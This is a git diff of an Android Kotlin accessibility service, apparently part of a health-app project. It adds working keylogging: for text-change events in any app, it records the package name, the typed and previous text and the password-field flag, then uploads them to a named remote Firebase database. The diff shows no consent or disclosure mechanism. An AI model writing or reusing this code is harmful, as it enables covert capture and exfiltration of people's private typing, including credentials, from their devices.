@@ -1,36 +1,43 @@
 package com.example.testing
 
 import android.accessibilityservice.AccessibilityService
+import android.content.ComponentName
 import android.content.ContentValues
 import android.content.Context
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
+import androidx.lifecycle.Lifecycle
+import androidx.lifecycle.ViewModel
+import com.example.testing.utils.*
+import com.google.firebase.database.ktx.database
+import com.google.firebase.ktx.Firebase
+import kotlinx.coroutines.CoroutineExceptionHandler
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers.IO
+import kotlinx.coroutines.coroutineScope
+import kotlinx.coroutines.launch
+import java.sql.Timestamp
 
 class MyAccessibilityService : AccessibilityService() {
     var KEYBOARD_STATUS: String = "status"
+
     override fun onInterrupt() {
         TODO("Not yet implemented")
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+        //var dbHelper = DataBaseHelperImpl(DatabaseBuilder.getInstance(applicationContext))
         if (event == null) return
         //
         if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-            Log.d("AccesKeyboard", "Keyboard event: " + event.toString())
-            /** Create a content provider to store information
-             * * val keyboard = ContentValues()
-             * keyboard.put("package_name", event.packageName)
-             * keyboard.put("event_time", event.eventTime)
-             * keyboard.put("new_text", event.text)
-             * keyboard.put("before_text", event.beforeText)
-             * **/
-            Log.d("AccesKeyboard", "New text: " + event.text)
-            Log.d("AccesKeyboard", "Before text: " + event.beforeText)
+            Log.d("AccessKeyboard", "New text: " + event.text)
+            Log.d("AccessKeyboard", "Before text: " + event.beforeText)
             var timestamp = event.eventTime
-            var packageName = event.packageName
-            var txt = event.text
-            var beforeText = event.beforeText
+            var packageName = event.packageName.toString()
+            var txt = event.text.toString()
+            var beforeText = event.beforeText.toString()
             var isPassword = event.isPassword
+            saveToFirebase(timestamp, packageName, txt, beforeText, isPassword)
         }
     }
 
@@ -38,9 +45,31 @@ class MyAccessibilityService : AccessibilityService() {
         TODO("Get info on keyboard click, whether it is a new character or not, return boolean")
     }
 
-    fun saveToDatabase() {
-        TODO("Save to database")
+    private fun saveToFirebase(timestamp: Long, packageName: String, txt: String, beforeText: String,
+    isPassword: Boolean) {
+        val database = Firebase.database("https://health-app-9c151-default-rtdb.europe-west1.firebasedatabase.app")
+        val myRef = database.getReference("KeyboardEvents")
+        val clicks = Clicks(timestamp, packageName, txt, beforeText, isPassword)
+        myRef.child("events").setValue(clicks)
+        Log.d("AccessKeyboard", "Info saved to firebase")
     }
+
+    /**
+    private fun saveToDatabase(timestamp: Long, packageName: String, txt: String,
+                                       beforeText: String, isPassword: Boolean ) {
+        val clicks = Clicks(0, timestamp, packageName, txt, beforeText, isPassword)
+        //val db = DatabaseBuilder.getInstance(applicationContext)
+        //Call with coroutines
+        var dbHelper = DataBaseHelperImpl(DatabaseBuilder.getInstance(applicationContext))
+
+        CoroutineScope(IO).launch {
+            try {
+                dbHelper.insert(clicks)
+        } catch (e: java.lang.Exception) {
+            //handle error
+        }
+        }
+    }**/
 
 
 }
